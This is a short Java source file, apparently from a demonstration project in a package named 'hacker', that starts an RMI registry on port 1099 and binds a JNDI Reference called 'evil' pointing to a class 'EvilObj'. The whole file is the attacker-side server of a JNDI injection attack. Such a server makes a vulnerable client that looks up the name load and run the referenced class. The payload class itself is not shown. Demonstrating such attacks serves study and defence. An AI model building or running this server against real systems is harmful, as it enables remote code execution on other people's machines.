package cn.axboy.demo.hacker;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {

    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();
        Reference reference = new Reference("cn.axboy.demo.hacker.EvilObj", "cn.axboy.demo.hacker.EvilObj", null);
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("evil", wrapper);
        System.out.println("Create RMI registry on port 1099");
    }
}
